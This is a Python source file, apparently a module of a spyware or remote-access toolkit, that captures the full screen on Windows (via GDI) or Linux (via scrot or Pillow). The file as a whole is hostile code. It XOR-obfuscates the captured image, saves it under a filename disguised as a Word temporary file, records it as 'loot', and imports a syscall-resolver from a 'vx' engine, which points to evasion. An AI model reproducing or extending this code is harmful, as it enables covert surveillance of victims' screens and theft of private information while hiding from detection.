import os
import ctypes
import io

if os.name == 'nt':
    from ctypes import wintypes
    from engines.windows.vx_eng import SyscallResolver
else:
    # lightweight placeholders so Linux import succeeds
    class _Wintypes:
        DWORD = int
        LONG = int
        WORD = int

    wintypes = _Wintypes()
    SyscallResolver = None


def take_screenshot() -> bytes:
    """Capture entire screen and return raw image bytes.

    On Windows this uses GDI APIs and returns a BMP.  On Linux the function
    will attempt to invoke an external screenshot utility ("scrot") and
    return the raw image data (PNG or other) encrypted similarly.
    """
    # cross-platform switch
    if os.name != 'nt':
        # try to capture via scrot (common on X11) or fallback to pillow
        import subprocess, tempfile
        tmp = os.path.join(tempfile.gettempdir(), "triad_scr.png")
        try:
            subprocess.run(["scrot", tmp], check=True)
            with open(tmp, "rb") as f:
                data = f.read()
        except Exception:
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="PNG")
                data = buf.getvalue()
            except Exception:
                data = b""
        # simple XOR encryption with same key used on Windows
        key = 0xAA
        return bytes(b ^ key for b in data)

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    hdc_screen = user32.GetDC(None)
    width = user32.GetSystemMetrics(0)
    height = user32.GetSystemMetrics(1)

    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
    gdi32.SelectObject(hdc_mem, hbitmap)
    SRCCOPY = 0x00CC0020
    gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY)

    # prepare BITMAPINFOHEADER for DIB
    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ('biSize', wintypes.DWORD),
            ('biWidth', wintypes.LONG),
            ('biHeight', wintypes.LONG),
            ('biPlanes', wintypes.WORD),
            ('biBitCount', wintypes.WORD),
            ('biCompression', wintypes.DWORD),
            ('biSizeImage', wintypes.DWORD),
            ('biXPelsPerMeter', wintypes.LONG),
            ('biYPelsPerMeter', wintypes.LONG),
            ('biClrUsed', wintypes.DWORD),
            ('biClrImportant', wintypes.DWORD),
        ]

    bih = BITMAPINFOHEADER()
    bih.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bih.biWidth = width
    bih.biHeight = height
    bih.biPlanes = 1
    bih.biBitCount = 24
    bih.biCompression = 0
    bih.biSizeImage = width * height * 3

    buf_size = bih.biSizeImage
    buf = ctypes.create_string_buffer(buf_size)
    gdi32.GetDIBits(hdc_mem, hbitmap, 0, height, buf, ctypes.byref(bih), 0)

    # construct minimal BMP header
    bmp_header = b'BM' + (54 + buf_size).to_bytes(4, 'little') + b'\x00\x00\x00\x00' + b'\x36\x00\x00\x00'
    bmp_header += bytes(bih)
    bmp = bmp_header + buf.raw

    # write to disk in TEMP with random name simulating system temp file
    import random, string, os
    dirpath = os.environ.get("LOCALAPPDATA") or os.environ.get("TEMP")
    if not dirpath:
        dirpath = os.getcwd()
    fname = "~WRD" + "".join(random.choices(string.digits, k=4)) + ".tmp.bmp"
    fullpath = os.path.join(dirpath, fname)
    try:
        with open(fullpath, "wb") as f:
            f.write(bmp)
        # record last loot path
        from core.storage.manager import set_last_loot
        set_last_loot(fullpath)
    except Exception:
        pass
    # simple XOR encryption
    key = 0xAA
    encrypted = bytes([b ^ key for b in bmp])
    return encrypted
